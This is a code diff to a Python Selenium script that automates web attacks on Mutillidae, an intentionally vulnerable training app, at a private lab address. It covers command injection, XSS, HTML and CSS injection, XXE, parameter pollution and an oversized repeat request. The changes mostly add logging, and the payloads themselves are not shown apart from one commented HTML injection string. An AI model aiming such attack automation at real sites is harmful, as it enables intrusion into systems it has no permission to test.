@@ -14,10 +14,16 @@ from modules.SeleniumDrivers import FirefoxBrowser, FirefoxBrowserSeleniumWire
 
 def buffer_overflow(ip="192.168.255.133", sleep_time=0):
     browser = FirefoxBrowser().driver
+    word_to_repeat = "hello"
+    number_of_repeats = 200000000
+    print(f"String to repeat: {word_to_repeat}")
+    print(f"Number of repeats: {number_of_repeats}")
     try:
         browser.get(f"http://{ip}/mutillidae/index.php?page=repeater.php")
-        browser.find_element(By.NAME, "string_to_repeat").send_keys("hello")
-        browser.find_element(By.NAME, "times_to_repeat_string").send_keys("200000000")
+        browser.find_element(By.NAME, "string_to_repeat").send_keys(word_to_repeat)
+        browser.find_element(By.NAME, "times_to_repeat_string").send_keys(
+            number_of_repeats
+        )
         browser.find_element(By.NAME, "repeater-php-submit-button").click()
         sleep(sleep_time)
     except NoSuchElementException as e:
@@ -41,6 +47,7 @@ def css_injection(
     verify_default_payload=True,
 ):
     browser = FirefoxBrowser().driver
+    print(f"Payload to be used: {payload}")
     try:
         browser.get(f"http://{ip}/mutillidae/index.php?page=set-background-color.php")
         # browser.find_element(By.ID, "id_background_color").send_keys("<h1>infected</h1>")
@@ -74,6 +81,7 @@ def command_injection(
     verify_default_payload=True,
 ):
     browser = FirefoxBrowser().driver
+    print(f"Payload to be used: {payload}")
     try:
         browser.get(f"http://{ip}/mutillidae/index.php?page=dns-lookup.php")
         browser.find_element(By.ID, "idTargetHostInput").send_keys(payload)
@@ -99,6 +107,7 @@ def frame_source_injection(
     verify_default_payload=True,
 ):
     browser = FirefoxBrowser().driver
+    print(f"Payload to be used: {payload}")
     try:
         browser.get(
             f"http://{ip}/mutillidae/index.php?page=document-viewer.php&PathToDocument={payload}"
@@ -124,6 +133,7 @@ def html_injection(
     verify_default_payload=True,
 ):
     browser = FirefoxBrowser().driver
+    print(f"Payload to be used: {payload}")
     try:
         browser.get(
             f"http://{ip}/mutillidae/index.php?page=password-generator.php&username={payload}"
@@ -150,6 +160,7 @@ def html_injection_via_cookie_into_phpsessid(
     verify_default_payload=True,
 ):
     browser = FirefoxBrowser().driver
+    print(f"Payload to be used: {payload}")
     try:
         browser.get(f"http://{ip}/mutillidae/index.php?page=capture-data.php")
         initial_cookies = browser.get_cookies()
@@ -177,6 +188,7 @@ def html_injection_via_dom_injection(
     verify_default_payload=True,
 ):
     browser = FirefoxBrowser().driver
+    print(f"Payload to be used: {payload}")
     try:
         browser.get(
             f"http://{ip}/mutillidae/index.php?page=password-generator.php&username={payload}"
@@ -200,6 +212,7 @@ def xss_injection_via_dom_injection(
     verify_default_payload=True,
 ):
     browser = FirefoxBrowser().driver
+    print(f"Payload to be used: {payload}")
     try:
         browser.get(
             f"http://{ip}/mutillidae/index.php?page=password-generator.php&username={payload}"
@@ -242,6 +255,7 @@ def http_parameter_pollution(
     verify_default_payload=True,
 ):
     browser = FirefoxBrowser().driver
+    print(f"Payload to be used: {payload}")
     try:
         browser.get(
             f"http://{ip}/mutillidae/index.php?page=user-poll.php&csrf-token=&choice=nmap&initials=test{payload}&user-poll-php-submit-button=Submit+Vote&"
@@ -268,6 +282,7 @@ def javascript_injection(
     verify_default_payload=True,
 ):
     browser = FirefoxBrowser().driver
+    print(f"Payload to be used: {payload}")
     try:
         browser.get(
             f"http://{ip}/mutillidae/index.php?page=password-generator.php&username={payload}"
@@ -314,6 +329,7 @@ def xml_external_entity_injection(
     verify_default_payload=True,
 ):
     browser = FirefoxBrowser().driver
+    print(f"Payload to be used: {payload}")
     try:
         browser.get(f"http://{ip}/mutillidae/index.php?page=xml-validator.php")
         browser.find_element(By.ID, "idXMLTextArea").send_keys(payload)
@@ -342,6 +358,7 @@ def xss_injection_via_http_header(
     verify_default_payload=True,
 ):
     browser = FirefoxBrowser(headless=True).driver
+    print(f"Payload to be used: {payload}")
     try:
         browser.get(
             f"http://{ip}/mutillidae/index.php?page=site-footer-xss-discussion.php"
